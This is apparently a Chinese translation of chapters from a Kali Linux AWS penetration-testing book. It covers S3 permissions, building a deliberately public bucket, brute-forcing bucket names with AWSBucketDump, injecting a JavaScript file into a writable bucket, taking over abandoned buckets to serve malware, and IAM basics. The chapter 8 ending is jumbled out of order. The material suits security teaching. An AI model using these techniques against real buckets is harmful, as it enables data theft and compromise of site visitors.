# Kali Linux AWS 渗透测试实用指南（二）

> 原文：[`annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7`](https://annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第三部分：渗透测试 AWS 简单存储服务配置和安全。

本节涵盖了识别和利用易受攻击和配置错误的 S3 存储桶的过程。

本节将涵盖以下章节：

+   第七章，“侦察-识别易受攻击的 S3 存储桶”

+   第八章，“利用宽松的 S3 存储桶获取乐趣和利润”


# 第七章：侦察-识别易受攻击的 S3 存储桶

**简单存储服务**（**S3**）存储桶是 AWS 基础设施中最受欢迎的攻击面之一，也是最容易受到黑客攻击的攻击面。

本章解释了 AWS S3 存储桶的概念，它们的用途以及如何设置和访问它们。然而，本章的主要重点是各种 S3 存储桶权限、识别配置不当或过于宽松的存储桶的不同方法，以及连接到这些存储桶。最后，我们将重点关注基于域名和子域名的自动化方法，以识别多个地区中易受攻击的 S3 存储桶，并探测它们的权限，以找到潜在的易受攻击的存储桶。

在本章中，我们将涵盖以下主题：

+   设置我们的第一个 S3 存储桶

+   探索 AWS S3 权限和访问 API

+   从一个易受攻击的 S3 存储桶中读取和写入

# 设置您的第一个 S3 存储桶

我们将首先前往 S3 主页，网址为[`s3.console.aws.amazon.com/s3/`](https://s3.console.aws.amazon.com/s3/)：

1.  在 S3 主页上，点击“创建存储桶”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1dc4faa2-77a1-43cb-9e8f-b428492b0973.png)

1.  在下一页上，为您的存储桶分配一个名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4cf3f66c-8970-47c8-8d2d-4fd9647845c7.png)

在分配存储桶名称时，您必须遵循以下准则：

+   +   为您的 S3 存储桶使用唯一的、符合**域名系统**（DNS）的名称。

+   存储桶名称必须至少为 3 个字符，最多为 63 个字符。

+   不允许使用大写字符或下划线。

+   存储桶名称可以以小写字母或数字开头。

+   存储桶名称可以包含小写字母、数字和连字符。存储桶名称也可以根据标签使用（.）字符进行分隔。

+   不要以 IP 地址的形式格式化存储桶名称（例如，`172.16.1.3`）。

1.  如果愿意，您可以选择地理区域；我们将为我们的存储桶命名为`kirit-bucket`。

1.  点击“创建存储桶”，您的存储桶将被创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9efae629-3897-48ba-b40f-19298bf21256.png)

一旦存储桶启动运行，您应该能够上传对象到存储桶中。如果你想知道对象是什么，它可以是任何文件，比如图像文件、音乐文件、视频文件或文档。

1.  要上传一个对象，点击存储桶并选择“上传”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/51ea0628-a832-4384-ad3d-b2d883feee82.png)

文件浏览器将打开，您可以上传任何您想要的文件。

1.  要下载一个对象，只需勾选对象的复选框，然后选择“下载”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d561c3c4-0852-4687-bc83-cd978f8742fe.png)

# S3 权限和访问 API

S3 存储桶有两种权限系统。第一种是**访问控制策略**（**ACPs**），主要由 Web UI 使用。这是一个简化的权限系统，为其他权限系统提供了一层抽象。另外，我们有**IAM 访问策略**，这是给您提供权限的 JSON 对象。

权限适用于存储桶或对象。存储桶权限就像主钥；为了让某人访问对象，您需要先让他们访问存储桶，然后再让他们访问对象本身。

S3 存储桶对象可以从 WebGUI 访问，就像我们之前看到的那样。否则，它们可以使用`aws s3` cmdlet 从 AWS 命令行界面（**CLI**）访问。您可以使用它来上传、下载或删除存储桶对象。

为了使用 AWS CLI 上传和下载对象，我们可以采取以下方法：

1.  首先安装`awscli`：

```
sudo apt install awscli
```

1.  使用新用户凭证配置`awscli`。为此，我们需要访问密钥 ID 和秘密访问密钥。要获取这些信息，请按照以下步骤进行：

1.  登录到您的 AWS 管理控制台

1.  点击页面右上角的用户名

1.  从下拉菜单中点击“安全凭证”链接

1.  找到“访问凭证”部分，并复制最新的访问密钥 ID

1.  单击同一行中的“显示”链接，并复制“秘密访问密钥”

1.  一旦您获得了这些，发出以下命令：

```
aws configure
```

输入您的访问密钥 ID 和秘密访问密钥。请记住不要公开此信息，以确保您的帐户安全。您可以将默认区域和输出格式设置为无。

1.  一旦您的帐户设置好了，就可以非常容易地访问 S3 存储桶的内容：

```
aws s3 ls s3://kirit-bucket
```

在前面的代码中，`kirit-bucket`将被替换为您的存储桶名称。

1.  如果要在存储桶内遍历目录，只需在前面的输出中列出的目录名称后面加上`/`，例如，如果我们有一个名为`new`的文件夹：

```
aws s3 ls s3://kirit-bucket/new
```

1.  要将文件上传到 S3 存储桶，发出`cp`命令，后跟文件名和目标存储桶的完整文件路径：

```
aws s3 cp abc.txt s3://kirit-bucket/new/abc.txt
```

1.  要在 S3 存储桶上删除文件，发出`rm`命令，后跟完整的文件路径：

```
aws s3 rm s3://kirit-bucket/new/abc.txt
```

# ACPs/ACLs

**访问控制列表**（**ACLs**）的概念与可用于允许访问 S3 存储桶的防火墙规则非常相似。每个 S3 存储桶都附有 ACL。这些 ACL 可以配置为向 AWS 帐户或组提供对 S3 存储桶的访问权限。

有四种主要类型的 ACLs：

+   **读取**：具有读取权限的经过身份验证的用户将能够查看存储桶内对象的文件名、大小和最后修改信息。他们还可以下载他们有权限访问的任何对象。

+   **写入**：经过身份验证的用户有权限读取和删除对象。用户还可以删除他们没有权限的对象；此外，他们可以上传新对象。

+   **read-acp**：经过身份验证的用户可以查看他们有权限访问的任何存储桶或对象的 ACL。

+   **write-acp**：经过身份验证的用户可以修改他们有权限访问的任何存储桶或对象的 ACL。

一个对象最多只能有 20 个策略，这些策略是前面四种类型的组合，针对特定的受让人。受让人是指任何个人 AWS 帐户（即电子邮件地址）或预定义组。IAM 帐户不能被视为受让人。

# 存储桶策略

每个 S3 存储桶都附有存储桶策略，可以应用于存储桶内和其中的对象。在多个存储桶的情况下，可以轻松复制策略。可以通过指定资源（例如"data/*"）将策略应用于单个文件夹。这将使策略适用于文件夹中的每个对象。

您可以使用 Web UI 向 S3 存储桶添加策略。该操作位于存储桶属性页面的权限选项卡下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/927e293d-ef4a-4b0d-b214-b2dcf6080278.png)

接下来，我们将看到如何为 IAM 用户配置存储桶访问权限。

# IAM 用户策略

为了向单个 IAM 帐户提供 S3 访问权限，我们可以使用 IAM 用户策略。这是一种为任何 IAM 帐户提供受限访问权限的非常简单的方法。

IAM 用户策略在必须将 ACL 权限应用于特定 IAM 帐户时非常方便。如果您在犹豫是使用 IAM 还是存储桶策略，一个简单的经验法则是确定权限是针对多个存储桶中的特定用户，还是您有多个用户，每个用户都需要自己的权限集。在这种情况下，IAM 策略比存储桶策略更合适，因为存储桶策略仅限于 20 KB。

# 访问策略

访问策略是描述授予任何用户对对象或存储桶的权限的细粒度权限。它们以 JSON 格式描述，并可分为三个主要部分：`"Statement"`、`"Action"`和`"Resource"`。

以下是 JSON 格式的存储桶策略示例：

```
{
    "Version": "2008-02-27",
    "Statement": [
     {
            "Sid": "Statement",
            "Effect": "Allow",
            "Principal": {
            "AWS": "arn:aws:iam::Account-ID:user/kirit"
        },
        "Action": [
            "s3:GetBucketLocation",
            "s3:ListBucket",
            "s3:GetObject"
        ],
        "Resource": [
            "arn:aws:s3:::kirit-bucket"
        ]
     }
  ]
}
```

JSON 对象有三个主要部分。首先，在`"Statement"`部分中，我们可以看到有两点需要注意——“Effect”：“Allow”，以及包含“AWS”：“arn:aws:iam::Account-ID:user/kirit”的`"Principal"`部分。这基本上意味着`"kirit"`用户帐户被授予对对象的权限。

其次是“操作”部分，描述了用户被允许的权限。我们可以看到用户被允许列出`"s3:ListBucket"`存储桶内的对象，并从`"s3:GetObject"`存储桶下载对象。

最后，“资源”部分描述了授予权限的资源。综合起来，策略总结为允许`kirit`用户帐户在名为`kirit-bucket`的存储桶下`GetBucketLocation`、`ListBucket`和`GetObject`。

# 创建易受攻击的 S3 存储桶

在下一个练习中，我们将尝试从一个对整个世界公开的易受攻击的 S3 存储桶中读取和写入。为此，我们将设置一个 S3 存储桶，并故意使其易受攻击，使其可以公开读取和写入。

我们将首先转到 S3 主页（[`s3.console.aws.amazon.com/s3/`](https://s3.console.aws.amazon.com/s3/)）并创建一个可以公开访问的易受攻击的存储桶：

1.  创建一个新的 S3 存储桶。

1.  存储桶创建后，选择存储桶，然后单击“编辑所选存储桶的公共访问设置”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/23277051-ffc6-4fce-bbce-81b192ca9937.png)

1.  取消选中所有复选框，然后单击保存。这样做是为了删除对存储桶施加的任何访问限制：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f0ce3d4e-6436-45c3-b4e8-d25a1a4b6f91.png)

1.  AWS 将要求您确认更改；在字段中键入`confirm`并单击确认：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2f86b4ed-4524-497b-ae0e-90b12e309d0c.png)

1.  单击存储桶，然后在侧边栏上单击“权限”选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6e717c5b-5a5c-47c9-a864-c37649115a33.png)

1.  转到访问控制列表，在公共访问下，单击“所有人”。侧边栏将打开；启用所有复选框。这告诉 AWS 允许公共访问存储桶；这就是使存储桶容易受攻击的原因：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b7cd2860-4115-46e8-9db1-2896bce2b972.png)

1.  单击保存，存储桶将变为公开。

现在我们有了易受攻击的存储桶，我们可以将一些对象上传到其中并使它们公开；例如，我们将一个小文本文件上传到存储桶中：

1.  创建一个小文本文档。

1.  输入您的存储桶并单击上传：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/be799896-8559-499b-8db0-ad538f1f03a9.png)

1.  选择文件并上传。

文件上传后，单击对象，您将收到一个 S3 URL，以从外部访问对象。您可以简单地将浏览器指向 URL 以访问存储桶：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d9e96639-a59e-4eb3-9ff3-03eef463745d.png)

对象 URL 链接位于页面底部，如前面的屏幕截图所示。

我们的易受攻击的 S3 存储桶现在已经设置并对公众开放；任何人都可以读取或写入该存储桶。

在下一章中，我们将学习如何识别此类易受攻击的存储桶，并使用 AWSBucketDump 外部传输数据。

# 摘要

在本章中，我们学习了什么是 S3 存储桶，如何设置 S3 存储桶以及如何在 S3 存储桶上授予访问权限。我们详细了解了 S3 权限，以及每种权限适用的方式和位置。我们演示了如何设置 AWS CLI 并通过 CLI 访问 S3 存储桶。我们还了解了可以使 S3 存储桶易受攻击的设置类型。最后，我们设置了我们自己的易受攻击的 S3 存储桶，这将在下一章中使用。

在下一章中，我们将学习如何利用 S3 存储桶。我们将研究用于利用易受攻击的 S3 存储桶的工具。此外，我们将学习在利用易受攻击的 S3 存储桶后可以应用的各种后利用技术。

# 进一步阅读

+   **Amazon S3 REST API 介绍**：[`docs.aws.amazon.com/AmazonS3/latest/API/Welcome.html`](https://docs.aws.amazon.com/AmazonS3/latest/API/Welcome.html)

+   **Amazon S3 示例**：[`boto3.amazonaws.com/v1/documentation/api/latest/guide/s3-examples.html`](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/s3-examples.html)

+   在策略中指定权限：[`docs.aws.amazon.com/AmazonS3/latest/dev/using-with-s3-actions.html`](https://docs.aws.amazon.com/AmazonS3/latest/dev/using-with-s3-actions.html)


# 第八章：利用宽松的 S3 存储桶进行娱乐和利润。

利用 S3 存储桶并不仅限于读取敏感信息。例如，包含在 S3 存储桶中的 JavaScript 可以被设置后门，以影响加载受感染 JavaScript 的 Web 应用程序的所有用户。

本章将介绍利用易受攻击的 S3 存储桶的过程，以识别被 Web 应用程序加载的 JS 文件，并在其中设置后门以获得全用户妥协。除此之外，还将重点放在识别易受攻击的 S3 存储桶中存储的敏感凭据和其他数据机密，并利用这些内容来实现对连接应用程序的进一步妥协。

在本章中，我们将涵盖以下主题：

+   从暴露的 S3 存储桶中提取敏感数据

+   向 S3 存储桶注入恶意代码

+   为了持久访问后门 S3 存储桶

# 从暴露的 S3 存储桶中提取敏感数据

在之前的第七章中，*侦察-识别易受攻击的 S3 存储桶*，我们学习了如何通过使其公开可用来创建易受攻击的存储桶。在本章中，我们将学习如何识别易受攻击的存储桶，并尝试从每个存储桶中提取数据。

因此，一旦存储桶设置好，我们将尝试从外部人员的角度攻击易受攻击的存储桶。为了实现这一点，我们将使用`AWSBucketDump`工具。这是一个非常方便的工具，用于识别易受攻击的 S3 存储桶。`AWSBucketDump`工具可以在 GitHub 页面[`github.com/jordanpotti/AWSBucketDump`](https://github.com/jordanpotti/AWSBucketDump)上找到。

让我们看看如何使用`AWSBucketDump`提取敏感数据：

1.  克隆该工具并`cd`到该文件夹中：

```
git clone https://github.com/jordanpotti/AWSBucketDump
cd AWSBucketDump
```

接下来，我们将需要配置工具使用字典来暴力破解并找到易受攻击的 S3 存储桶。

1.  在任何文本编辑器中打开`BucketNames.txt`文件。该文件包含一个有限的单词列表，用于识别开放的存储桶。但是，您可以使用更大的单词列表来增加击中开放存储桶的机会。

1.  为了演示目的，我们将在单词列表中添加`bucket`关键字。

这里的单词非常常见，那么我们如何识别与我们目标组织特定的存储桶？我们将把组织的名称作为这些单词的前缀。由于我们的存储桶名为`kirit-bucket`，我们将在单词列表中的每个单词前添加`kirit`作为前缀。为此，我们将使用`vim`来使我们的工作更容易。

1.  在`vim`中打开`BucketNames.txt`文件：

```
vim BucketNames.txt
```

1.  在`vim`中，为每个单词添加前缀，发出以下命令：

```
:%s/^/kirit-/g
or :%s/^/<<prefix>>/g 
```

1.  使用以下命令保存文本文件：

```
:wq
```

1.  创建一个空文件：

```
touch found.txt
```

1.  在运行`AWSBucketDump`之前，我们需要确保满足所有 Python 依赖关系。为此，有一个名为`requirements.txt`的文本文件，其中列出了所有所需的 Python 模块。我们只需要安装它们。使用以下命令：

```
sudo pip install -r requirements.txt
```

1.  现在，是时候运行`AWSBucketDump`了。发出以下命令：

```
python AWSBucketDump.py -D -l BucketNames.txt -g interesting_Keywords.txt
```

脚本将使用单词列表，然后尝试暴力破解并找到公开的 S3 存储桶。然后将列出的任何开放的存储桶使用`interesting_Keywords.txt`中的关键字进行搜索。

从脚本输出中，我们可以看到`AWSBucketDump`找到了开放的存储桶：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e0fb3e95-1399-4a2d-8337-7e121f6c5a0a.png)

在下一节中，我们将看到如何可以在一个易受攻击的 S3 存储桶中设置后门并注入恶意代码。

# 向 S3 存储桶注入恶意代码

如果一个 Web 应用程序正在从一个公开可写的 S3 存储桶中获取其内容会发生什么？让我们考虑这样一个情景，您有一个 Web 应用程序，它从一个 S3 存储桶中加载所有内容（图像、脚本等）。如果这个存储桶偶然被公开给全世界，攻击者可以上传他的恶意`.js`文件到 S3 存储桶，然后被 Web 应用程序渲染。

为了演示目的，我们将设置一个非常基本的 HTML 页面，链接到托管在 S3 存储桶上的 JavaScript 文件：

```
<!DOCTYPE html>
 <html >
 <head>
<!--Link JavaScript---->
 <script type="text/javascript" src="img/vulnscript.js"></script>
 <!--Vulnerable JavaScript-->
</head>
 <body><!-- Your web--></body>
 </html>
```

正如你所看到的，页面调用了托管在 S3 上的.js 文件（[`s3.us-east-2.amazonaws.com/kirit-bucket/vulnscript.js`](https://s3.us-east-2.amazonaws.com/kirit-bucket/vulnscript.js)）。我们已经找出了如何识别有漏洞的 S3 存储桶。如果这个存储桶也有漏洞，我们可以上传我们自己的恶意 vulnscript.js 文件。

当下次网页加载时，它将自动运行我们的恶意.js 脚本：

1.  首先创建一个恶意的.js 脚本，弹出一个警报，类似于 XSS 攻击。为了演示，我们将使用以下 Javascript 代码：

```
alert("XSS")
```

1.  把它放在一个文件中，并以与在 HTML 代码中找到的文件相同的名称保存。

1.  在最后一章中，我们学习了如何使用 AWS CLI 上传文件。同样地，将你的 js 文件上传到有漏洞的存储桶：

```
aws s3 cp vulnscript.js s3://kirit-bucket/vulnscript.js --acl public-read
```

1.  现在，再次访问 Web 应用程序，它将加载和呈现有漏洞的脚本。你应该会得到一个典型的 XSS 弹出警报：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b166bf40-e631-4067-bd09-2cef18bc093c.png)

在接下来的部分，我们将看到如何在 S3 存储桶中设置后门，以侵害用户的计算机。

# 为了持久访问后门 S3 存储桶

S3 存储桶有时可能被遗弃。也就是说，可能存在应用程序和/或脚本向不存在的 S3 存储桶发出请求。

为了演示这样的情况，让我们假设一个 S3 存储桶的 URL 是[`s3bucket`](http://storage.example.com.s3-website.ap-south-1.amazonaws.com/)*.*[example.com.s3-website.ap-south-1.amazonaws.com](http://example.com.s3-website.ap-south-1.amazonaws.com/)。

这个 URL 可能绑定到组织的子域（例如[`data.example.net`](https://storage.example.net/)），以混淆 AWS S3 URL。这是通过添加替代域名（CNAMEs）来实现的。

然而，随着时间的推移，绑定到 URL 的存储桶[`data.example.net`](https://data.example.net)可能被删除，但 CNAME 记录仍然存在。因此，攻击者可以创建一个与未认领存储桶同名的 S3 存储桶，并上传恶意文件以提供服务。当受害者访问 URL 时，他将得到恶意内容。

你如何识别这个漏洞？

1.  寻找一个错误页面，上面显示 404 Not Found 的消息和 NoSuchBucket 消息。为了实现这一点，我们可以枚举特定主机的子域，并寻找说存储桶未找到的错误页面，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1151afbf-0b19-41a7-be7a-af4edc4699ea.png)

1.  一旦发现了这样一个未认领的存储桶，就在与 URL 相同的地区创建一个同名的 S3 存储桶。

1.  在新创建的 S3 存储桶上部署恶意内容。

当网站的任何用户尝试访问有漏洞的 URL 时，攻击者存储桶中的恶意内容将呈现在受害者的网站上。攻击者可以上传恶意软件到存储桶，然后提供给用户。

让我们假设一个应用程序正在调用一个未被认领的 S3 存储桶。该应用程序请求安装程序文件，下载它们，然后执行脚本。如果存储桶被遗弃，攻击者可以劫持存储桶并上传恶意软件，从而提供持久访问。

在 HackerOne 的漏洞赏金计划中可以找到这样的案例研究[`hackerone.com/reports/399166`](https://hackerone.com/reports/399166)。

正如我们所看到的，脚本从 S3 存储桶中获取.tgz 文件，解压并在受害者的设备上执行文件。攻击者可以利用这个漏洞上传一个持久的后门到 S3 存储桶中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/12295081-951b-4f5d-acd9-db61b1ebdc57.png)

当受害者运行脚本时，它将下载包含恶意脚本的.tgz 文件，解压并在受害者的计算机上执行恶意软件。

进一步阅读

# [`github.com/jordanpotti/AWSBucketDump`](https://github.com/jordanpotti/AWSBucketDump)

然而，需要注意的是，这种漏洞高度依赖于调用未声明的 S3 存储桶的脚本。

在下一章中，我们将学习如何对 AWS Lambda 进行渗透测试。我们将研究如何利用有漏洞的 Lambda 实例，并学习端口利用方法，比如从受损的 AWS Lambda 中进行枢轴攻击。

# [`hackerone.com/reports/172549`](https://hackerone.com/reports/172549)

+   在上一章的延续中，我们学习了如何利用有漏洞的 S3 存储桶。我们进行了`AWSBucketDump`的演示，以及如何使用它来从有漏洞的 S3 存储桶中转储数据。此外，我们还学习了如何利用未声明的 S3 存储桶，以及如何在有漏洞和/或未声明的 S3 存储桶中植入后门和注入恶意代码。

+   总结

+   [`aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/`](https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/)


# 第四部分：AWS 身份访问管理配置和安全性

在本节中，我们将看看 AWS IAM 以及如何使用它、Boto3 和 Pacu 来提升我们的权限并在目标 AWS 账户中建立持久性。

本节将涵盖以下章节：

+   第九章，《AWS 上的身份访问管理》

+   第十章，《使用盗窃的密钥、Boto3 和 Pacu 提升 AWS 账户权限》

+   第十一章，《使用 Boto3 和 Pacu 维持 AWS 持久性》


# 第九章：AWS 上的身份访问管理

AWS 提供了许多不同的方法供用户通过 IAM 服务对其帐户进行身份验证，其中最常见的包括用户帐户和角色。IAM 用户提供了为需要长期访问环境的内容设置凭据的手段。用户可以通过使用用户名和密码进行 Web UI 身份验证来访问 AWS API，也可以通过使用 API 密钥（访问密钥 ID 和秘密访问密钥）来以编程方式发出请求。

另一方面，角色提供了将临时凭据委派给用户/服务/应用程序的手段。具有`sts:AssumeRole`权限的 IAM 用户可以假定角色以获取一组 API 密钥（访问密钥 ID、秘密访问密钥和会话令牌），这些密钥仅在短时间内有效。默认情况下，密钥的生命周期设置为在这些密钥到期之前的一小时。这些密钥将具有被分配给被假定角色的权限，并且通常用于完成某些任务。通过使用这种模型，环境中的 AWS 用户不会始终拥有他们可能需要使用的每个权限；相反，他们可以根据需要请求角色具有的权限。这允许更严格的审计和权限管理。

AWS IAM 还有一种称为**组**的资源。组可用于将一组用户委派给一组权限。在 AWS 环境示例中，可能会有一个名为**开发人员**的组，该组提供公司开发人员需要访问的服务。然后，用户可以添加到该组，并且他们将继承与之关联的权限。只要他们是相关组的成员，用户将保留所提供的权限。单个用户最多可以成为 10 个不同组的成员，单个组最多可以容纳允许的用户总数。

IAM 用户、角色和组对我们的攻击过程和对 AWS 基础设施的基本理解至关重要。本章旨在提供有关 IAM 服务一些常见功能以及我们如何作为常规 AWS 用户和攻击者使用它们的见解。

在本章中，我们将使用 IAM 服务来涵盖以下主题：

+   如何创建 IAM 用户、组、角色和相关权限

+   如何限制特定角色可访问的 API 操作和资源

+   使用 IAM 访问密钥

+   签署 AWS API 请求

# 创建 IAM 用户、组、角色和相关权限

当您登录到 AWS Web 控制台时，可以通过导航到 IAM 服务页面来创建用户、组和角色：

1.  要进入 IAM 页面，请单击页面左上角的“服务”按钮，然后搜索并单击 IAM 页面的相关链接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6df3ba5b-11e9-4933-ac29-7da82fbedd52.png)

在 AWS Web 控制台的服务下拉菜单中搜索 IAM 服务

1.  以下图显示了 IAM 仪表板上用户、组和角色的相关链接。单击“用户”继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cf9a5a8a-6211-4ddb-8598-b00b7b98857e.png)

IAM 仪表板上的相关链接

1.  要创建 IAM 用户，请单击页面左上角的“添加用户”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/08c712c9-f983-48f1-8887-5ee43bbe8395.png)

用户仪表板上的“添加用户”按钮

然后，您将看到一个页面，要求输入用户名和要为新用户提供的访问类型。您可以选择的两种访问类型之一是程序访问，它会为用户创建访问密钥 ID 和秘密访问密钥，以便他们可以通过 AWS CLI 或为各种编程语言提供的 SDK 访问 AWS API。另一种是 AWS 管理控制台访问，它将自动生成密码或允许您设置自定义密码，以便用户可以访问 AWS Web 控制台。

1.  对于我们的示例，让我们创建一个名为`Test`的用户，允许访问 AWS API。填写完毕后，您可以点击“下一步：权限”继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8c2b4aeb-256e-48bd-93e6-e0a1a160bd81.png)

图 4：创建一个名为 Test 的新用户，允许访问 AWS API

1.  继续后，您将看到三个选项来设置这个新用户的权限。

如果您想创建一个没有任何权限的用户（例如，如果您打算稍后处理这些权限），您可以直接点击“下一步：审核”跳过此页面。

提供的三个选项允许您执行以下操作：

+   +   将用户添加到 IAM 组

+   复制另一个现有用户的权限

+   直接将现有的 IAM 策略附加到用户

点击第三个选项，直接将现有策略附加到用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e58d2e60-01bd-481e-9a93-fbfee5c6111c.png)

图 5：选择直接将现有策略附加到新用户的选项

这样做后，您将看到一个 IAM 策略列表。

1.  在出现的搜索框中，输入`AmazonEC2FullAccess`并勾选出现的策略左侧的框。这个策略将为用户提供对 EC2 服务的完全访问权限，以及通常与 EC2 一起使用的其他服务。如果您有兴趣查看此策略的 JSON 文档，可以点击策略名称旁边的箭头，然后点击{} JSON 按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0a3ea57e-2b69-47a7-b388-076adf17afcb.png)

图 6：查看我们选择的 IAM 策略的 JSON 文档

IAM 策略是以 JSON 格式的文档，指定了允许或拒绝的权限、这些权限适用的资源以及这些权限对某个用户、组或角色有效的条件。

有两种 IAM 策略：AWS 管理的策略和客户管理的策略。AWS 管理的策略是 AWS 管理的预定义权限集。AWS 管理的策略可以通过策略名称旁边的小橙色 AWS 符号来识别。客户不允许修改这些 AWS 管理的策略，它们被提供作为设置权限时的便利方法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ae4087d6-e870-4ad6-8e68-1eac34a9027a.png)

图 7：选择了 AWS 管理策略 AmazonEC2FullAccess

客户管理的策略与 AWS 管理的策略相同，只是它们必须在任何时候创建，并且可以完全自定义。这些策略允许您将对各种 IAM 用户、组和角色的细粒度访问权限委托给您的帐户。

1.  现在，我们可以点击窗口底部右侧的“下一步：审核”按钮继续。接下来的页面将是我们刚刚设置的摘要，所以我们可以继续点击窗口底部右侧的“创建用户”按钮。

1.  接下来，您将看到一个绿色的成功消息，并有选择查看或下载与这个新用户相关的访问密钥 ID 和秘密访问密钥的选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2d0edbea-25a7-4dcd-89c3-38b71b8ebc00.png)

图 8：创建新 IAM 用户后呈现的成功页面

这是这些凭证唯一可用的时间，因此重要的是将这些信息安全地存储在只有您可以访问的地方。

同样的一般过程也可以用来创建角色和组。

如果我们想创建一个组并将我们的新用户添加到其中，我们可以按照以下步骤进行：

1.  在 AWS Web 控制台的 IAM 页面的“组”选项卡中导航，然后点击左上角的“创建新组”。

1.  为这个组提供一个名称；在我们的示例中，它将是`Developers`。

1.  我们将被要求选择一个要附加到该组的 IAM 策略，我们将搜索并将 IAMReadOnlyAccess AWS 管理策略添加到我们的组中。

1.  点击下一步，我们将看到一个我们想要创建的组的摘要，我们可以通过点击右下角的“创建组”来完成这个过程，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c74da7ec-0c7c-4079-adaa-3fa474086c75.png)

图 9：创建名为 Developers 的新组，并附加 IAMReadOnlyAccess 策略

1.  现在组已经创建，我们可以从 IAM 组页面点击它，然后会看到类似下面的屏幕截图，我们可以点击“添加用户到组”按钮来添加我们的新用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a994979d-fe18-4271-9567-6810fe9bb71b.png)

我们新创建的组目前还没有任何用户

1.  然后我们可以搜索并勾选我们之前创建的`Test`用户旁边的复选框，然后点击“添加用户”按钮，如下面的屏幕截图所示，来完成这个过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a0c41e40-b403-4f0d-b535-c0fb697c0066.png)

选择并将我们的 Test 用户添加到我们的新 Developers 组中

1.  现在，如果我们导航到我们`Test`用户的用户页面，我们可以看到我们之前附加的 AmazonEC2FullAccess AWS 托管策略附加到了我们的用户，以及另一个部分，来自组附加，其中包括我们的用户从`Developers`组继承的 IAMReadOnlyAccess AWS 托管策略：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0a875368-505e-4f0b-828c-5d5d9f930982.png)

直接附加到我们的用户的策略和从 Developers 组继承的策略

1.  如果我们想知道我们的用户属于哪些组，以及我们的用户从这些组中继承了哪些策略，我们可以点击“组（1）”选项卡，它会给我们这些信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6fec2d0f-c795-4a73-a17a-89631846149f.png)

我们的用户所属的组以及我们从这些组中继承的策略

角色不能添加到组中，但 IAM 策略可以以与为用户和组相同的方式附加和移除。角色具有一个额外的重要特性，称为**信任关系**。信任关系指定谁可以假定（请求临时凭证）所讨论的角色，并在什么条件下可以发生。

我创建了一个角色，与 AWS EC2 服务创建了信任关系，这意味着 EC2 资源可以请求此角色的临时凭证。查看特定角色时，下面的屏幕截图显示了信任关系选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d1a0b832-0a48-4439-b56d-ae5e355a1f48.png)

信任关系选项卡

在突出显示的部分，我们可以看到我们有一个受信任的实体，它是身份提供者 ec2.amazonaws.com。

信任关系在一个名为**假定角色策略**文档的 JSON 文档中指定。我们的示例角色有以下假定角色策略文档：

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
     "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

